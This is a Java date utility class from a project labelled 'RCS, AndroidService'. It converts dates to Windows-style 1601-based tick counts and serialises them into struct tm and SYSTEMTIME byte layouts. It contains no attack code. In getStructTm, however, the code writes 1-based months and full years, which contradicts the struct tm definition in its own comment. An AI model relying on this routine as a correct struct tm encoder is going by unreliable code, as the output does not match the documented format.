/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : DateTime.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.util;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import com.android.service.Messages;
import com.android.service.auto.Cfg;

// TODO: Auto-generated Javadoc
/**
 * The Class DateTime.
 */
public final class DateTime {
	/** The debug. */
	private static final String TAG = "DateTime"; //$NON-NLS-1$
	/** The Constant TICK. */
	public static final long TICK = 1; // 100 nano secondi

	/** The Constant MILLISEC. */
	public static final long MILLISEC = 10000 * TICK;

	/** The Constant SECOND. */
	public static final long SECOND = 1000 * MILLISEC;

	/** The Constant MINUTE. */
	public static final long MINUTE = 60 * SECOND;

	/** The Constant HOUR. */
	public static final long HOUR = 60 * MINUTE;

	/** The Constant DAY. */
	public static final long DAY = 24 * HOUR;

	/** The Constant DAYS_FROM_1601_TO_1970. */
	public static final long DAYS_FROM_1601_TO_1970 = 134774;

	/** The Constant TICSK_FROM_1601_TO_1970. */
	public static final long TICSK_FROM_1601_TO_1970 = DAYS_FROM_1601_TO_1970 * DAY;

	/** The Constant BASE_YEAR_TM. */
	private static final int BASE_YEAR_TM = 1900;

	/** The ticks. */
	long ticks;

	/** The date. */
	Date date;

	/**
	 * Instantiates a new date time.
	 */
	public DateTime() {
		this(new Date());
	}

	/**
	 * Instantiates a new date time.
	 * 
	 * @param date
	 *            the date
	 */
	public DateTime(final Date date) {
		final long millisecs = date.getTime();
		this.date = new Date(millisecs);

		ticks = millisecs * MILLISEC + TICSK_FROM_1601_TO_1970;
	}

	/**
	 * Instantiates a new date time.
	 * 
	 * @param ticks
	 *            the ticks
	 */
	public DateTime(final long ticks) {
		this.ticks = ticks;
		date = new Date((ticks - TICSK_FROM_1601_TO_1970) / MILLISEC);
	}

	/**
	 * Gets the date.
	 * 
	 * @return the date
	 */
	public Date getDate() {
		final Date ldate = new Date((ticks - TICSK_FROM_1601_TO_1970) / MILLISEC);
		if (Cfg.DEBUG) {
			Check.ensures(ldate.getTime() == date.getTime(), "Wrong getTime()"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.ensures((new DateTime(ldate)).getFiledate() == ticks, "Wrong date"); //$NON-NLS-1$
		}
		return date;
	}

	/**
	 * Gets the filedate.
	 * 
	 * @return the filedate, 100 ns starting from 1601
	 */
	public long getFiledate() {
		return ticks;
	}

	/**
	 * struct tm { int tm_sec; // seconds after the minute [0-60] int tm_min; //
	 * minutes after the hour [0-59] int tm_hour; // hours since midnight [0-23]
	 * int tm_mday; // day of the month [1-31] int tm_mon; // months since
	 * January [0-11] int tm_year; // years since 1900 int tm_wday; // days
	 * since Sunday [0-6] int tm_yday; // days since January 1 [0-365] int
	 * tm_isdst; // Daylight Savings Time flag long tm_gmtoff;// offset from CUT
	 * in seconds char *tm_zone; //timezone abbreviation };.
	 * 
	 * @return the struct tm
	 */
	public synchronized byte[] getStructTm() {
		if (Cfg.DEBUG) {
			Check.requires(date != null, "getStructTm date != null"); //$NON-NLS-1$
		}
		final int tm_len = 9 * 4;

		final byte[] buffer = new byte[tm_len];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, tm_len);

		final Calendar calendar = Calendar.getInstance();
		calendar.setTime(date);

		databuffer.writeInt(calendar.get(Calendar.SECOND));

		databuffer.writeInt(calendar.get(Calendar.MINUTE));
		databuffer.writeInt(calendar.get(Calendar.HOUR_OF_DAY));

		databuffer.writeInt(calendar.get(Calendar.DAY_OF_MONTH));
		databuffer.writeInt(calendar.get(Calendar.MONTH) + 1);
		databuffer.writeInt(calendar.get(Calendar.YEAR));

		databuffer.writeInt(calendar.get(Calendar.DAY_OF_WEEK)); // days
		// since
		// Sunday
		// [0-6]
		databuffer.writeInt(0); // days since January 1 [0-365]
		databuffer.writeInt(0); // Daylight Savings Time flag

		return buffer;

	}

	/**
	 * Gets the ordered string.
	 * 
	 * @return the ordered string
	 */
	public String getOrderedString() {
		final SimpleDateFormat format = new SimpleDateFormat(Messages.getString("DateTime.0")); //$NON-NLS-1$
		return format.format(date);
	}

	/**
	 * Hi date time.
	 * 
	 * @return the int
	 */
	public int hiDateTime() {
		final int hi = (int) (ticks >> 32);
		return hi;
	}

	/**
	 * Low date time.
	 * 
	 * @return the int
	 */
	public int lowDateTime() {
		final int low = (int) (ticks);
		return low;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Object#toString()
	 */
	@Override
	public String toString() {
		return getDate().toString();
	}

	/**
	 * Gets the filedate.
	 * 
	 * @param date
	 *            the date
	 * @return the filedate
	 */
	public static long getFiledate(final Date date) {
		final DateTime datetime = new DateTime(date);
		return datetime.getFiledate();
	}

	/**
	 * Gets the struct systemdate.
	 * 
	 * @return the struct systemdate
	 */
	public byte[] getStructSystemdate() {
		final int size = 16;
		final byte[] output = new byte[size];
		final DataBuffer databuffer = new DataBuffer(output);

		final Calendar calendar = Calendar.getInstance();
		calendar.setTime(date);

		databuffer.writeShort((short) calendar.get(Calendar.YEAR));

		databuffer.writeShort((short) (calendar.get(Calendar.MONTH) + 1));
		databuffer.writeShort((short) calendar.get(Calendar.DAY_OF_WEEK));
		databuffer.writeShort((short) calendar.get(Calendar.DAY_OF_MONTH));

		databuffer.writeShort((short) calendar.get(Calendar.HOUR_OF_DAY));
		databuffer.writeShort((short) calendar.get(Calendar.MINUTE));
		databuffer.writeShort((short) calendar.get(Calendar.SECOND));
		databuffer.writeShort((short) calendar.get(Calendar.MILLISECOND));

		if (Cfg.DEBUG) {
			Check.ensures(output.length == size, "getStructSystemdate wrong size"); //$NON-NLS-1$
		}
		return output;
	}

}
